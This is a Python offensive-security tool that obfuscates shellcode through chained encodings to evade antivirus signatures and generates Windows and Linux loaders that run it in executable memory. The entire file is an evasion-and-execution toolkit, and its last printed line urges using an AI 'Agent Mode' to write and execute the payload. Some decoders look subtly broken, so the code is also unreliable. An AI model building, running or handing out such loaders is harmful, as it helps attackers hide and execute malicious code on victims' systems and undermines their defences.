#!/usr/bin/env python3
"""
Shellcode Obfuscator v2.0 — Red Team Utility
Purpose: Evade signature-based detection by transforming raw shellcode
         through multiple obfuscation layers.

Usage:
    python3 obfuscator.py --shellcode "\\xfc\\xe8\\x82..." --techniques xor,base64,insertion
    python3 obfuscator.py -f shellcode.bin -t all -o output.py
"""

import argparse
import base64
import random
import sys
import os
import string
import hashlib
from typing import List, Tuple, Optional

# ─────────────────────────────── ENCODING ENGINES ───────────────────────────────

def encode_xor(sc: bytes, key: int = None) -> Tuple[bytes, int]:
    """XOR encode shellcode with a single-byte key."""
    key = key if key is not None else random.randint(1, 255)
    return bytes(b ^ key for b in sc), key


def encode_xor_multi(sc: bytes, key_len: int = 4) -> Tuple[bytes, bytes]:
    """XOR encode with a multi-byte repeating key."""
    key = bytes(random.randint(1, 255) for _ in range(key_len))
    encoded = bytes(sc[i] ^ key[i % key_len] for i in range(len(sc)))
    return encoded, key


def encode_rot(sc: bytes, shift: int = None) -> Tuple[bytes, int]:
    """ADD/ROT encoding — adds a constant byte to each byte."""
    shift = shift if shift is not None else random.randint(1, 127)
    return bytes((b + shift) & 0xFF for b in sc), shift


def encode_sub(sc: bytes, shift: int = None) -> Tuple[bytes, int]:
    """SUB encoding — subtracts a constant byte from each byte."""
    shift = shift if shift is not None else random.randint(1, 127)
    return bytes((b - shift) & 0xFF for b in sc), shift


def encode_not(sc: bytes) -> Tuple[bytes, None]:
    """Bitwise NOT on each byte."""
    return bytes(~b & 0xFF for b in sc), None


def encode_aes_placeholder(sc: bytes) -> Tuple[bytes, bytes]:
    """
    Simple substitution + XOR with randomly generated S-box.
    Not real AES — a lightweight substitution-permutation for AV evasion.
    """
    seed = random.randint(0, 2**32 - 1)
    rng = random.Random(seed)
    sbox = list(range(256))
    rng.shuffle(sbox)
    
    # Substitute
    subbed = bytes(sbox[b] for b in sc)
    # XOR with a derived key
    key = bytes(rng.randint(1, 255) for _ in range(16))
    encoded = bytes(subbed[i] ^ key[i % 16] for i in range(len(subbed)))
    
    # Store the inverse S-box for later decoding
    inv_sbox = [0] * 256
    for i, v in enumerate(sbox):
        inv_sbox[v] = i
    
    return encoded, (key, sbox, inv_sbox, seed)


def encode_insertion(sc: bytes, junk_char: bool = True) -> Tuple[bytes, int]:
    """
    Insert random junk bytes between every real byte.
    junk_char=True -> insert a single byte; False -> insert 1-3 bytes.
    Returns (encoded, step) where step is the interleave interval.
    """
    result = bytearray()
    for b in sc:
        result.append(b)
        if junk_char:
            result.append(random.randint(0, 255))
        else:
            for _ in range(random.randint(1, 3)):
                result.append(random.randint(0, 255))
    return bytes(result), (1 if junk_char else random.randint(1, 3))


def encode_split_interleave(sc: bytes, chunk_size: int = 2) -> bytes:
    """
    Split shellcode into N chunks and interleave them.
    E.g., chunk_size=2: [b1,b2,b3,b4] -> [b1,b3,b2,b4]
    """
    chunks = [sc[i::chunk_size] for i in range(chunk_size)]
    result = bytearray()
    # Interleave back
    max_len = max(len(c) for c in chunks)
    for i in range(max_len):
        for c in chunks:
            if i < len(c):
                result.append(c[i])
    return bytes(result)


def encode_uuid(sc: bytes) -> List[str]:
    """
    Encode shellcode as an array of UUID strings.
    Each 16 bytes -> one UUID. Pads last chunk with 0x90 if needed.
    """
    # Pad to multiple of 16
    remainder = len(sc) % 16
    if remainder:
        sc += b'\x90' * (16 - remainder)
    
    uuids = []
    for i in range(0, len(sc), 16):
        chunk = sc[i:i+16]
        # UUID format: 8-4-4-4-12
        hex_str = chunk.hex()
        uuid_str = f"{hex_str[0:8]}-{hex_str[8:12]}-{hex_str[12:16]}-{hex_str[16:20]}-{hex_str[20:32]}"
        uuids.append(uuid_str)
    return uuids


def encode_ipv6(sc: bytes) -> List[str]:
    """
    Encode shellcode as IPv6 addresses.
    Each 16 bytes -> one IPv6 address.
    """
    remainder = len(sc) % 16
    if remainder:
        sc += b'\x90' * (16 - remainder)
    
    ips = []
    for i in range(0, len(sc), 16):
        chunk = sc[i:i+16]
        parts = ':'.join(f"{chunk[j]:02x}{chunk[j+1]:02x}" for j in range(0, 16, 2))
        ips.append(parts)
    return ips


def encode_base64(sc: bytes) -> str:
    """Standard base64 encoding."""
    return base64.b64encode(sc).decode()


def encode_hex_string(sc: bytes, separator: str = "\\x") -> str:
    """Hex string format."""
    if separator == "\\x":
        return ''.join(f"\\x{b:02x}" for b in sc)
    return sc.hex(separator)


# ─────────────────────────── DECODER STUB GENERATORS ───────────────────────────

def gen_decoder_xor(key: int, var_name: str = "buf") -> str:
    return f"""# XOR decoder (key=0x{key:02x})
for i in range(len({var_name})):
    {var_name}[i] ^= 0x{key:02x}
"""


def gen_decoder_xor_multi(key: bytes, var_name: str = "buf") -> str:
    key_bytes = ', '.join(f"0x{b:02x}" for b in key)
    key_len = len(key)
    return f"""# Multi-byte XOR decoder (key_len={key_len})
key = [{key_bytes}]
for i in range(len({var_name})):
    {var_name}[i] ^= key[i % {key_len}]
"""


def gen_decoder_rot(shift: int, var_name: str = "buf") -> str:
    return f"""# ROT decoder (subtract {shift})
for i in range(len({var_name})):
    {var_name}[i] = ({var_name}[i] - {shift}) & 0xFF
"""


def gen_decoder_sub(shift: int, var_name: str = "buf") -> str:
    return f"""# ADD decoder (add {shift} back)
for i in range(len({var_name})):
    {var_name}[i] = ({var_name}[i] + {shift}) & 0xFF
"""


def gen_decoder_not(var_name: str = "buf") -> str:
    return f"""# NOT decoder
for i in range(len({var_name})):
    {var_name}[i] ^= 0xFF
"""


def gen_decoder_insertion(step: int, var_name: str = "buf") -> str:
    return f"""# Insertion decoder (strip junk bytes, step={step})
buf_clean = bytearray()
for i in range(0, len({var_name}), {step + 1 if step == 1 else step + random.randint(1,3)}):
    buf_clean.append({var_name}[i])
{var_name} = buf_clean
"""


def gen_decoder_aes(key: bytes, sbox: List[int], inv_sbox: List[int], var_name: str = "buf") -> str:
    sbox_str = ', '.join(f"0x{b:02x}" for b in sbox[:16]) + ", ..."
    return f"""# S-box decoder (reverse substitution + XOR)
key = [{', '.join(f'0x{b:02x}' for b in key)}]
inv_sbox = {inv_sbox}
for i in range(len({var_name})):
    {var_name}[i] ^= key[i % 16]
    {var_name}[i] = inv_sbox[{var_name}[i]]
"""


def gen_decoder_uuid(var_name: str = "buf") -> str:
    return f"""# UUID decoder
import uuid
{var_name} = bytearray()
for u in uuids:
    {var_name}.extend(uuid.UUID(u).bytes)
"""


def gen_decoder_ipv6(var_name: str = "buf") -> str:
    return f"""# IPv6 decoder
import ipaddress
{var_name} = bytearray()
for ip_str in ip_addresses:
    {var_name}.extend(ipaddress.IPv6Address(ip_str).packed)
"""


def gen_decoder_base64(var_name: str = "buf") -> str:
    return f"""# Base64 decoder
import base64
{var_name} = bytearray(base64.b64decode(encoded_b64))
"""


def gen_decoder_hex(var_name: str = "buf") -> str:
    return f"""# Hex decoder
{var_name} = bytearray.fromhex(encoded_hex)
"""


# ─────────────────────────────── MAIN OBFUSCATOR ───────────────────────────────

class ShellcodeObfuscator:
    """Multi-technique shellcode obfuscator with decoder generation."""
    
    TECHNIQUES = {
        'xor':        (encode_xor, gen_decoder_xor, "Single-byte XOR"),
        'xor_multi':  (encode_xor_multi, gen_decoder_xor_multi, "Multi-byte XOR"),
        'rot':        (encode_rot, gen_decoder_rot, "ADD/ROT shift"),
        'sub':        (encode_sub, gen_decoder_sub, "SUB shift"),
        'not':        (encode_not, gen_decoder_not, "Bitwise NOT"),
        'aes_like':   (encode_aes_placeholder, gen_decoder_aes, "S-Box substitution + XOR"),
        'insertion':  (encode_insertion, gen_decoder_insertion, "Junk byte insertion"),
        'base64':     (encode_base64, gen_decoder_base64, "Base64 encoding"),
        'uuid':       (encode_uuid, gen_decoder_uuid, "UUID string encoding"),
        'ipv6':       (encode_ipv6, gen_decoder_ipv6, "IPv6 address encoding"),
    }
    
    def __init__(self, shellcode: bytes):
        self.shellcode = shellcode
        self.history = []
    
    def apply(self, technique: str) -> dict:
        """Apply a single obfuscation technique and return metadata."""
        if technique not in self.TECHNIQUES:
            raise ValueError(f"Unknown technique: {technique}. Available: {list(self.TECHNIQUES.keys())}")
        
        encode_fn, decode_fn, desc = self.TECHNIQUES[technique]
        
        if technique == 'uuid':
            result = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': result,
                'size': len(str(result)),
                'decoder_stub': decode_fn(),
            }
        elif technique == 'ipv6':
            result = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': result,
                'size': len(str(result)),
                'decoder_stub': decode_fn(),
            }
        elif technique == 'base64':
            result = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': result,
                'size': len(result),
                'decoder_stub': decode_fn(),
            }
        elif technique == 'xor':
            encoded, key = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'key': key,
                'size': len(encoded),
                'decoder_stub': decode_fn(key),
            }
        elif technique == 'xor_multi':
            encoded, key = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'key': key,
                'size': len(encoded),
                'decoder_stub': decode_fn(key),
            }
        elif technique == 'rot':
            encoded, shift = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'shift': shift,
                'size': len(encoded),
                'decoder_stub': decode_fn(shift),
            }
        elif technique == 'sub':
            encoded, shift = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'shift': shift,
                'size': len(encoded),
                'decoder_stub': decode_fn(shift),
            }
        elif technique == 'not':
            encoded, _ = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'size': len(encoded),
                'decoder_stub': decode_fn(),
            }
        elif technique == 'aes_like':
            encoded, aux = encode_fn(self.shellcode)
            key, sbox, inv_sbox, seed = aux
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'key': key,
                'sbox': sbox,
                'inv_sbox': inv_sbox,
                'seed': seed,
                'size': len(encoded),
                'decoder_stub': decode_fn(key, sbox, inv_sbox),
            }
        elif technique == 'insertion':
            encoded, step = encode_fn(self.shellcode)
            metadata = {
                'technique': technique,
                'description': desc,
                'encoded': encoded,
                'step': step,
                'size': len(encoded),
                'decoder_stub': decode_fn(step),
            }
        else:
            raise ValueError(f"Unhandled technique: {technique}")
        
        self.history.append(metadata)
        return metadata
    
    def apply_chain(self, techniques: List[str]) -> List[dict]:
        """Apply a chain of techniques sequentially, feeding output as new input."""
        results = []
        for tech in techniques:
            meta = self.apply(tech)
            results.append(meta)
            # Feed encoded output as new shellcode for chaining
            encoded = meta['encoded']
            if isinstance(encoded, list):
                # For UUID/IPv6, join and convert back
                if meta['technique'] == 'uuid':
                    import uuid
                    raw = bytearray()
                    for u_str in encoded:
                        raw.extend(uuid.UUID(u_str).bytes)
                    self.shellcode = bytes(raw)
                elif meta['technique'] == 'ipv6':
                    import ipaddress
                    raw = bytearray()
                    for ip_str in encoded:
                        raw.extend(ipaddress.IPv6Address(ip_str).packed)
                    self.shellcode = bytes(raw)
            elif isinstance(encoded, str):
                # Base64 -> decode back to bytes for next round
                if meta['technique'] == 'base64':
                    self.shellcode = base64.b64decode(encoded)
            else:
                self.shellcode = encoded
        return results
    
    def generate_payload_python(self, techniques: List[str], output_file: str = None,
                                 execution_method: str = 'ctypes') -> str:
        """
        Generate a complete Python payload with decoder stubs and execution.
        execution_method: 'ctypes' (Windows) or 'mmap' (Linux/OSX)
        """
        results = self.apply_chain(techniques)
        
        lines = []
        lines.append('#!/usr/bin/env python3')
        lines.append('# Shellcode Obfuscated Payload')
        lines.append(f'# Techniques: {", ".join(techniques)}')
        lines.append(f'# Original size: {len(self.shellcode)} bytes')
        lines.append(f'# SHA256: {hashlib.sha256(self.shellcode).hexdigest()}')
        lines.append('')
        lines.append('import sys')
        lines.append('')
        
        # ── Embedded encoded payload ──
        last_meta = results[-1]
        last_tech = last_meta['technique']
        
        if last_tech == 'uuid':
            lines.append('# Encoded as UUID strings')
            lines.append('uuids = [')
            for u in last_meta['encoded']:
                lines.append(f'    "{u}",')
            lines.append(']')
            lines.append('')
        elif last_tech == 'ipv6':
            lines.append('# Encoded as IPv6 addresses')
            lines.append('ip_addresses = [')
            for ip in last_meta['encoded']:
                lines.append(f'    "{ip}",')
            lines.append(']')
            lines.append('')
        elif last_tech == 'base64':
            lines.append('# Base64 encoded shellcode')
            lines.append(f'encoded_b64 = "{last_meta["encoded"]}"')
            lines.append('')
        elif last_tech in ('xor', 'xor_multi', 'rot', 'sub', 'not', 'aes_like', 'insertion'):
            lines.append('# Encoded shellcode bytes')
            encoded = last_meta['encoded']
            # Format as hex array
            hex_bytes = ', '.join(f'0x{b:02x}' for b in encoded)
            lines.append(f'buf = bytearray([{hex_bytes}])')
            lines.append('')
        
        # ── Decoder stubs (applied in reverse order) ──
        lines.append('# ── Decoder stubs (reverse order) ──')
        for meta in reversed(results):
            decoder = meta['decoder_stub']
            lines.append(decoder)
            lines.append('')
        
        # ── Execution ──
        lines.append('# ── Execution ──')
        if execution_method == 'ctypes':
            lines.append('import ctypes')
            lines.append('')
            lines.append('# Allocate RWX memory')
            lines.append('ptr = ctypes.windll.kernel32.VirtualAlloc(')
            lines.append('    None,')
            lines.append('    len(buf),')
            lines.append('    0x1000,  # MEM_COMMIT')
            lines.append('    0x40     # PAGE_EXECUTE_READWRITE')
            lines.append(')')
            lines.append('')
            lines.append('# Copy shellcode to allocated memory')
            lines.append('ctypes.windll.kernel32.RtlMoveMemory(')
            lines.append('    ptr,')
            lines.append('    (ctypes.c_char * len(buf)).from_buffer(buf),')
            lines.append('    len(buf)')
            lines.append(')')
            lines.append('')
            lines.append('# Execute')
            lines.append('ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)()')
        elif execution_method == 'mmap':
            lines.append('import mmap')
            lines.append('')
            lines.append('# Create RWX memory mapping')
            lines.append('mm = mmap.mmap(-1, len(buf),')
            lines.append('              prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,')
            lines.append('              flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)')
            lines.append('mm.write(buf)')
            lines.append('')
            lines.append('# Cast and execute')
            lines.append('import ctypes')
            lines.append('fptr = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))')
            lines.append('fptr()')
        
        payload = '\n'.join(lines)
        
        if output_file:
            os.makedirs(os.path.dirname(output_file) or '.', exist_ok=True)
            with open(output_file, 'w') as f:
                f.write(payload)
            print(f"[+] Payload written to: {output_file}")
        
        return payload


# ────────────────────────────────── CLI ──────────────────────────────────

def parse_shellcode_input(data: str) -> bytes:
    """Parse various shellcode input formats into raw bytes."""
    data = data.strip()
    
    # \\xfc\\xe8 format
    if '\\x' in data:
        hex_str = data.replace('\\x', '')
        return bytes.fromhex(hex_str)
    
    # 0xfc, 0xe8 format
    if '0x' in data:
        parts = data.replace(',', ' ').split()
        hex_bytes = []
        for p in parts:
            p = p.strip()
            if p.startswith('0x') or p.startswith('0X'):
                hex_bytes.append(int(p, 16))
        return bytes(hex_bytes)
    
    # Raw hex string
    try:
        return bytes.fromhex(data)
    except ValueError:
        pass
    
    # Assume raw data (binary file content)
    return data.encode('latin-1')


def banner():
    print(r"""
  ┌─────────────────────────────────────────────┐
  │  ███████╗██╗  ██╗ ██████╗ ██████╗ ███████╗ │
  │  ██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔════╝ │
  │  ███████╗███████║██║   ██║██████╔╝█████╗   │
  │  ╚════██║██╔══██║██║   ██║██╔══██╗██╔══╝   │
  │  ███████║██║  ██║╚██████╔╝██║  ██║███████╗ │
  │  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ │
  │         Shellcode Obfuscator v2.0            │
  │         Red Team Utility — Authorized Use    │
  └─────────────────────────────────────────────┘
    """)


def main():
    parser = argparse.ArgumentParser(
        description='Shellcode Obfuscator — Evade signature detection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 obfuscator.py -s "\\xfc\\xe8\\x82\\x00\\x00\\x00" -t xor
  python3 obfuscator.py -f shellcode.bin -t xor,base64,uuid -o payload.py
  python3 obfuscator.py -s "\\xfc\\xe8" -t all -m ctypes -o /tmp/payload.py

Available techniques: xor, xor_multi, rot, sub, not, aes_like, insertion, base64, uuid, ipv6, all
        """
    )
    
    parser.add_argument('-s', '--shellcode', help='Shellcode string (e.g., \\\\xfc\\\\xe8\\\\x82...)')
    parser.add_argument('-f', '--file', help='Binary file containing raw shellcode')
    parser.add_argument('-t', '--techniques', nargs='+', default=['xor'],
                        help='Obfuscation techniques (comma-separated or space-separated)')
    parser.add_argument('-o', '--output', help='Output payload file (.py)')
    parser.add_argument('-m', '--method', choices=['ctypes', 'mmap'], default='ctypes',
                        help='Execution method (default: ctypes for Windows)')
    parser.add_argument('--list', action='store_true', help='List available techniques')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    
    args = parser.parse_args()
    
    if args.list:
        print("\nAvailable techniques:")
        for name, (_, _, desc) in ShellcodeObfuscator.TECHNIQUES.items():
            print(f"  {name:15s} - {desc}")
        print()
        return
    
    if not args.no_banner:
        banner()
    
    # Load shellcode
    if args.shellcode:
        sc = parse_shellcode_input(args.shellcode)
    elif args.file:
        with open(args.file, 'rb') as f:
            sc = f.read()
    else:
        print("[-] Provide shellcode via -s or -f")
        sys.exit(1)
    
    print(f"[+] Loaded shellcode: {len(sc)} bytes")
    print(f"[+] First 16 bytes: {sc[:16].hex()}")
    
    # Parse techniques
    techs = []
    for t in args.techniques:
        for subt in t.split(','):
            subt = subt.strip()
            if subt == 'all':
                techs = list(ShellcodeObfuscator.TECHNIQUES.keys())
                break
            elif subt in ShellcodeObfuscator.TECHNIQUES:
                techs.append(subt)
            else:
                print(f"[-] Unknown technique: {subt}")
                sys.exit(1)
        if techs == list(ShellcodeObfuscator.TECHNIQUES.keys()):
            break
    
    if not techs:
        techs = ['xor']
    
    print(f"[+] Techniques: {', '.join(techs)}")
    
    # Obfuscate
    obf = ShellcodeObfuscator(sc)
    
    if len(techs) == 1:
        meta = obf.apply(techs[0])
        print(f"[+] Encoded size: {meta['size']} bytes")
        if 'key' in meta:
            key = meta['key']
            if isinstance(key, int):
                print(f"[+] XOR key: 0x{key:02x}")
            elif isinstance(key, bytes):
                print(f"[+] Multi-byte key: {key.hex()}")
    else:
        metas = obf.apply_chain(techs)
        print(f"[+] Chain complete — {len(metas)} layers applied")
    
    # Generate payload
    payload = obf.generate_payload_python(techs, output_file=args.output, execution_method=args.method)
    
    if not args.output:
        print("\n" + "="*60)
        print("GENERATED PAYLOAD:")
        print("="*60)
        print(payload)
    
    print(f"\n[+] Done. Use Agent Mode to write and execute this payload.")


if __name__ == '__main__':
    main()